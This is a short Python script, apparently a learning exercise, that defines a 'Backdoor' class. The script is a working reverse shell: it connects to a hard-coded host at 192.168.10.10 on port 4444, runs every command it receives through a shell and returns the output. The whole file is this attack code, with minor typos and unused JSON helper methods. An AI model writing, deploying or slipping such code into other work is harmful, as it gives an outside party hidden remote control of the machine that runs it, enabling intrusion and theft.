#!usr/bin/python

import subprocess
import socket, json

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
    
    def exe_remort_command(self,command):
        return subprocess.check_output(command,shell=True)

    def reliable_send(self,data):
        json_data = json.dumps(data)
        return self.connection.send(json_data)

    def reliable_reveive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            print(command)
            result = self.exe_remort_command(command.decode())
            self.connection.send(result)
        
ip = "192.168.10.10"
port = 4444

backdoor = Backdoor(ip,port)
backdoor.run()